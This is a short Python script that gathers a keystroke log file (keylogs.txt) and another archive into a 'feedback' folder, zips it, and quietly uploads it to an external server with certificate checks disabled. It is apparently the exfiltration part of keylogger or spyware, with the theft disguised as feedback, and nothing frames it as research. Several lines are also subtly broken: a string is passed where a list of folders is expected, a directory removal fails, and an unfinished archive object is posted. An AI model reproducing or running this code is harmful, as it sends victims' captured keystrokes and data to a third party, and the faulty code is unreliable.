import requests, subprocess, os, zipfile


server_name = "https://cgsg.pml30.ru/subfile.php"
def zipdir(path, ziph):
    # ziph is zipfile handle
    for root, dirs, files in os.walk(path):
        try:
            for file in files:
                ziph.write(os.path.join(root, file),
                           os.path.relpath(os.path.join(root, file),
                                           os.path.join(path, '..')))
        except UserWarning:
            continue

def zipit(dir_list, zip_name):
    zipf = zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED)
    for dir in dir_list:
        zipdir(dir, zipf)
    return zipf

subprocess.getoutput("mkdir feedback")
os.chdir("feedback")
if os.path.exists("../keylogs.txt"):
    subprocess.getoutput("mv ../keylogs.txt ./")
if os.path.exists("../m.zip"):
    subprocess.getoutput("mv ../m.zip ./")

os.chdir("../")
zipf = zipit("feedback", "feedback.zip")
subprocess.getoutput("rm feedback")

requests.post(server_name, verify=False, files={'package': ("response.zip", zipf, 'application/zip')})
zipf.close()